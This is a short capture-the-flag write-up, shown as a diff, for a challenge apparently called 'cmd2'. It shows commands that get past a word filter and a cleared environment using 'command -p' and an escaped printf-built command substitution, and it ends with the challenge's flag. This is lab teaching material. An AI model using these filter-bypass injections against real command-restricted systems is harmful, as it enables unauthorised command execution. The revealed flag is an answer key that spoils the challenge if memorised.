@@ -1,0 +1,21 @@
+./cmd2 "command -p cat cmd2.c"
+
+The above command allows us to execute using the default path,
+and allows us to cat the cmd2 file.
+
+However, export FLAG as before won't work, as the env is deleted.
+
+Let's try something else...
+
+printf %c%c%c%c f l a g will print flag
+
+./cmd2 "command -p cat $(printf %c%c%c%c f l a g)"
+
+This almost works, but we run into the same problem as before; the $() is 
+executed before entering the program. So we escape $
+
+./cmd2 "command -p cat \$(printf %c%c%c%c f l a g)"
+
+The flag will be needed for cmd3, if I ever get there soooo:
+
+FuN_w1th_5h3ll_v4riabl3s_haha
